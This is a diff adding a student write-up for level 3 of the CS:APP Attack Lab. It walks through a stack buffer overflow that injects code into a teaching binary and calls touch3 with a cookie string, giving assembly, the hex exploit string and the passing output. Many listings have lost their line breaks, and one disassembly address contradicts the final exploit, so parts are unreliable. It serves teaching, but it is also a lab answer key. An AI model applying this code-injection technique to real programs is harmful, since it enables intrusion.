@@ -250,6 +250,79 @@ void touch3(char *sval) {
 
 The task is to get `CTARGET` to execute the code for `touch3` rather than returning to test. We must make it appear to `touch3` as if you have passed a string representation of your cookie as its argument.
 
+Basically, the things we need to do in this phase is kind of like what we did in phase 2. However, the difference is that this time, we need to pass our cookie value as the string rather than pass it directly. Another difference is that when we passing the cookie into the `touch3`, it will check the similarity by the function `hexmatch` rather than compared it directly due to the input format is string this time.
+
+**Note that** when functions `hexmatch` and `strncmp` are called, they push data onto the stack, overwriting portions of memory that held the buffer used by getbuf. As a result, you will need to be careful where you place the string representation of your cookie.
+
+The first thing we need to do is to check the Ascii code table and convert our cookie value to string. After check the Ascii table, the cookie value `0x59b997fa ` to `35 39 62 39 39 37 66 61`.   Moveover, due to each string must have a null character for indicating the end of string, we also need to add a null character to the parameter we pass to `touch3()`: `35 39 62 39 39 37 66 61 00`.
+
+Related ASCII code:
+
+```
+Hex  Char
+30    0
+31    1
+32    2
+33    3
+34    4
+35    5
+36    6
+37    7
+38    8
+39    9
+61    a
+62    b
+63    c
+64    d
+65    e
+66    f
+00    NUL '\0' (null character)
+```
+
+Here is the assembly code of `touch3`:
+
+```asm
+00000000004018fa <touch3>:  4018fa:	53                   	push   %rbx  4018fb:	48 89 fb             	mov    %rdi,%rbx  4018fe:	c7 05 d4 2b 20 00 03 	movl   $0x3,0x202bd4(%rip)        # 6044dc <vlevel>  401905:	00 00 00   401908:	48 89 fe             	mov    %rdi,%rsi  40190b:	8b 3d d3 2b 20 00    	mov    0x202bd3(%rip),%edi        # 6044e4 <cookie>  401911:	e8 36 ff ff ff       	callq  40184c <hexmatch>  401916:	85 c0                	test   %eax,%eax  401918:	74 23                	je     40193d <touch3+0x43>  40191a:	48 89 da             	mov    %rbx,%rdx  40191d:	be 38 31 40 00       	mov    $0x403138,%esi  401922:	bf 01 00 00 00       	mov    $0x1,%edi  401927:	b8 00 00 00 00       	mov    $0x0,%eax  40192c:	e8 bf f4 ff ff       	callq  400df0 <__printf_chk@plt>  401931:	bf 03 00 00 00       	mov    $0x3,%edi  401936:	e8 52 03 00 00       	callq  401c8d <validate>  40193b:	eb 21                	jmp    40195e <touch3+0x64>  40193d:	48 89 da             	mov    %rbx,%rdx  401940:	be 60 31 40 00       	mov    $0x403160,%esi  401945:	bf 01 00 00 00       	mov    $0x1,%edi  40194a:	b8 00 00 00 00       	mov    $0x0,%eax  40194f:	e8 9c f4 ff ff       	callq  400df0 <__printf_chk@plt>  401954:	bf 03 00 00 00       	mov    $0x3,%edi  401959:	e8 f1 03 00 00       	callq  401d4f <fail>  40195e:	bf 00 00 00 00       	mov    $0x0,%edi  401963:	e8 d8 f4 ff ff       	callq  400e40 <exit@plt>
+```
+
+**We can see that the first address of `touch3()` is `0x4018fa`.**
+
+Here is the assembly code of `hexmatch`
+
+```asm
+000000000040184c <hexmatch>:  40184c:	41 54                	push   %r12  40184e:	55                   	push   %rbp  40184f:	53                   	push   %rbx  401850:	48 83 c4 80          	add    $0xffffffffffffff80,%rsp  401854:	41 89 fc             	mov    %edi,%r12d  401857:	48 89 f5             	mov    %rsi,%rbp  40185a:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax  401861:	00 00   401863:	48 89 44 24 78       	mov    %rax,0x78(%rsp)  401868:	31 c0                	xor    %eax,%eax  40186a:	e8 41 f5 ff ff       	callq  400db0 <random@plt>  40186f:	48 89 c1             	mov    %rax,%rcx  401872:	48 ba 0b d7 a3 70 3d 	movabs $0xa3d70a3d70a3d70b,%rdx  401879:	0a d7 a3   40187c:	48 f7 ea             	imul   %rdx  40187f:	48 01 ca             	add    %rcx,%rdx  401882:	48 c1 fa 06          	sar    $0x6,%rdx  401886:	48 89 c8             	mov    %rcx,%rax  401889:	48 c1 f8 3f          	sar    $0x3f,%rax  40188d:	48 29 c2             	sub    %rax,%rdx  401890:	48 8d 04 92          	lea    (%rdx,%rdx,4),%rax  401894:	48 8d 04 80          	lea    (%rax,%rax,4),%rax  401898:	48 c1 e0 02          	shl    $0x2,%rax  40189c:	48 29 c1             	sub    %rax,%rcx  40189f:	48 8d 1c 0c          	lea    (%rsp,%rcx,1),%rbx  4018a3:	45 89 e0             	mov    %r12d,%r8d  4018a6:	b9 e2 30 40 00       	mov    $0x4030e2,%ecx  4018ab:	48 c7 c2 ff ff ff ff 	mov    $0xffffffffffffffff,%rdx  4018b2:	be 01 00 00 00       	mov    $0x1,%esi  4018b7:	48 89 df             	mov    %rbx,%rdi  4018ba:	b8 00 00 00 00       	mov    $0x0,%eax  4018bf:	e8 ac f5 ff ff       	callq  400e70 <__sprintf_chk@plt>  4018c4:	ba 09 00 00 00       	mov    $0x9,%edx  4018c9:	48 89 de             	mov    %rbx,%rsi  4018cc:	48 89 ef             	mov    %rbp,%rdi  4018cf:	e8 cc f3 ff ff       	callq  400ca0 <strncmp@plt>  4018d4:	85 c0                	test   %eax,%eax  4018d6:	0f 94 c0             	sete   %al  4018d9:	0f b6 c0             	movzbl %al,%eax  4018dc:	48 8b 74 24 78       	mov    0x78(%rsp),%rsi  4018e1:	64 48 33 34 25 28 00 	xor    %fs:0x28,%rsi  4018e8:	00 00   4018ea:	74 05                	je     4018f1 <hexmatch+0xa5>  4018ec:	e8 ef f3 ff ff       	callq  400ce0 <__stack_chk_fail@plt>  4018f1:	48 83 ec 80          	sub    $0xffffffffffffff80,%rsp  4018f5:	5b                   	pop    %rbx  4018f6:	5d                   	pop    %rbp  4018f7:	41 5c                	pop    %r12  4018f9:	c3                   	retq   
+```
+
+Just like what we did in CI-Level2, the return address of `getbuf()` should be overwritten by the first address where the injected code is placed. However, another difference from CI-Level2 is that the parameter passed to `$rdi `should not be the cookie value itself, but **the first address where the cookie string is stored**.
+
+To avoid the stack frame of `hexmatch` overwritten our exploit string, due to the stack frame of `hexmatch` is created after we pass the exploit string into `touch3`, we need to put  cookie string into the space the `hexmatch` will never reach. Thus, we decide to put cookie string into the padding area. Specifcally，we plan to put the Injection code to the top of stack frame for `getbuf()`, where it is `0x5561dc78`. Also, we will put the cookie string into after the return value, which is `0x5561dca0 + 0x8 = 0x5561dca8`
+
+Here is our code:
+
+```asm
+mov $0x5561dca8, %rdi // pass the address that store the cookie string in to rdipushq $0x4018fa // push the addr of touch3 into stackretq // return to touch 3
+```
+
+After using the `gcc -c code_injection.S` and `objdump -d code_injection.S > code_injection.txt`, we get the `Hexadecimal Code`.
+
+```bash
+code_injection.o:     file format elf64-x86-64Disassembly of section .text:0000000000000000 <.text>:   0:	48 c7 c7 88 dc 61 55 	mov    $0x5561dc88,%rdi   7:	68 fa 18 40 00       	pushq  $0x4018fa   c:	c3                   	retq   
+```
+
+Here is my final exploit string:
+
+```
+48 c7 c7 a8 dc 61 55 68		<- 0x5561dc78 : the top the stack frame for getbuffa 18 40 00 c3 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0078 dc 61 55 00 00 00 00 	<- Jump to 0x5561dc78
+35 39 62 39 39 37 66 61		<- The position store the cookie string
+```
+
+We finally pass the test:
+
+```bash
+➜  ~/cmu-15-213-CSAPP3E-lab/3.Attack_lab/target1 ./hex2raw < solutions/CI_Level3/CI_Level3.txt | ./ctarget -qCookie: 0x59b997faType string:Touch3!: You called touch3("59b997fa")Valid solution for level 3 with target ctargetPASS: Would have posted the following:	user id	bovik	course	15213-f15	lab	attacklab	result	1:PASS:0xffffffff:ctarget:3:48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 00 00 00 00 00 00 00
+	 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61 
+```
+
 ##	Part II: Return-Oriented Programming
 
 ###  2.1 Level 2
